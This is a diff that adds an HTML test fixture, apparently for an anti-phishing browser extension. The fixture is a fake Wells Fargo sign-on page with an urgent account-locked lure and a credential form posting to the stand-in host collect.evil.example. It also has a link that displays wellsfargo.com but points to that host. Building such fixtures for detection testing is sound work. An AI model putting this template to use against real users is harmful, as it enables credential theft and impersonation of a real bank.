@@ -1,0 +1,13 @@
+<!doctype html><html><head><meta charset="utf-8"><title>Wells Fargo Sign On</title></head>
+<body>
+<!-- Fake phishing page for testing the real extension. Harmless: the form posts to example. -->
+<h1>Wells Fargo</h1>
+<p>Security alert: your account has been locked due to unusual sign-in activity. Verify your identity within 24 hours.</p>
+<form action="https://collect.evil.example/p.php" method="post">
+  <label for="u">Username</label><input id="u" name="j_username" type="text" value="should-never-be-read">
+  <label for="p">Password</label><input id="p" name="j_password" type="password" value="secret-should-never-be-read">
+  <input type="hidden" name="token" value="x"><button>Sign On</button>
+</form>
+<a href="https://collect.evil.example/help">wellsfargo.com/help</a>
+<a href="/privacy">Privacy</a>
+</body></html>
